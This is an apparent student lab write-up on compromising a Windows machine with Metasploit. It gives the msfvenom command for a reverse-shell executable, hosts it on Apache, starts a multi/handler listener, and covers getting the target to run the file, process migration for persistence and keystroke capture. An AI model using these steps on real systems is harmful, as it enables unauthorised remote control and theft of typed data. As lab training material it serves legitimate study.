# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig.
## OUTPUT:
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/abe56c32-c71a-4b0c-8dde-23174d14e1d7)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.
## OUTPUT:
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/26395541-0d18-42da-a096-9129282278ca)
copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/555a7868-a083-4afe-bac3-80ed9d4d4cb1)
Start apache server sudo systemctl apache2 start
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/b573b48d-9c93-4b9f-a34f-65c7786060a7)
Check the status of apache2
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/90480c26-2ed1-44de-a9df-91c93c06aaa7)

Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/4b63689a-1409-41fb-9d13-6bb2ac744c34)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/5290fc3d-76aa-424b-b417-52c610b998fa)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/4f09158c-a7c7-4b49-9fed-f84199620f29)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.
![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/a0ccc7c1-01be-4572-b1cb-bfe5dbf4fad1)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/7d686d95-b0b3-43fa-987b-db3b31d63246)
keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/LOKESHKUMARPANCHATCHARAM/Compromising-windows-using-Metasploit/assets/119644432/ad721e5e-79e4-4464-b3f7-74c3269207ef)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
